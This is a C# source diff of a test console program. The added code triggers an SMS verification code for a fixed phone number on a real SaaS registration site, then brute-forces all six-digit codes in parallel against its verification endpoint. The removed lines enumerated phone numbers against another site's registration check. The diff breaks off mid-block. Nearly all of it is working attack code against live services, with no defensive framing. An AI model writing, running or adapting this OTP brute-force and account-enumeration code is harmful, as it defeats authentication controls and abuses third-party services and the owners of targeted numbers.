@@ -17,41 +17,46 @@ namespace Test
         static long TotalCount;
         static void Main(string[] ass)
         {
-            var v = new Version("1.8.0");
-            var v2 = new Version("1.8.1");
-            if (v > v2)
-            {
+            //var v = new Version("1.8.0");
+            //var v2 = new Version("1.8.1");
+            //if (v > v2)
+            //{
 
-            }
-            var bytes1 = new byte[5];
-          var dd= bytes1.ToHexString(1, 2);
-            PeInfo peInfo = new PeInfo(@"D:\Program Files\Xftp 6\nssftp.dll");
-            var tabale = peInfo.GetPETable();
-           
-            var bytes = System.IO.File.ReadAllBytes(@"F:\OneDrive\工具\端口测试.exe");
-            var magic = bytes[1] << 8 | bytes[0];//固定等于5A4D
-            var cplp = bytes[3] << 8 | bytes[2];// 文件最后一页的字节数
+            //}
+            //var bytes1 = new byte[5];
+            //var dd = bytes1.ToHexString(1, 2);
+            //PeInfo peInfo = new PeInfo(@"D:\Program Files\Xftp 6\nssftp.dll");
+            //var tabale = peInfo.GetPETable();
 
-            for (var i = 13800000000; i < 13800000002; i++)
+            //var bytes = System.IO.File.ReadAllBytes(@"F:\OneDrive\工具\端口测试.exe");
+            //var magic = bytes[1] << 8 | bytes[0];//固定等于5A4D
+            //var cplp = bytes[3] << 8 | bytes[2];// 文件最后一页的字节数
+
+            HttpHelper httpHelper = new HttpHelper();
+            httpHelper.Get("https://www.yinmaisoft.com/register.html");
+            var result = httpHelper.Get("https://jnpf.net.yinmaisoft.com/api/Saas/Tenant/SmsVerifyCode/15388886666/SMS_177245306");
+            if (result.Html.Contains("发送成功"))
             {
-                //  Console.WriteLine($"{DateTime.Now} 准备输入{i}");
-                run(i);
+                for (var i = 100000; i < 999999; i++)
+                {
+                    //  Console.WriteLine($"{DateTime.Now} 准备输入{i}");
+                    run(httpHelper, i);
+                }
             }
             Console.WriteLine("结束？");
             Console.ReadLine();
         }
-        private static async System.Threading.Tasks.Task run(long i)
+        private static async System.Threading.Tasks.Task run(HttpHelper httpHelper, long i)
         {
             await System.Threading.Tasks.Task.Factory.StartNew(() =>
             {
-                System.Diagnostics.Process.Start(@"D:\Program Files\Tencent\WeChat\WeChat.exe");
                 try
                 {
                     //  Console.WriteLine($"{DateTime.Now} 输入{i}");
-                    var result = HttpHelper.Default.Post($"http://bid.hzsteel.com/front/web/register/checkPhone.jhtml", new { mobile = i });
+                    var result = httpHelper.Get($"https://jnpf.net.yinmaisoft.com/api/Saas/Tenant/CheckVerifyCode/15388886666/{i}");
                     //   Console.WriteLine($"{DateTime.Now} 完成{i}");
                     Console.Title = i.ToString();
-                    if (!result.Html.Contains("false"))
+                    if (result.Success&&!result.Html.Contains("不正确"))
                     {
 
 
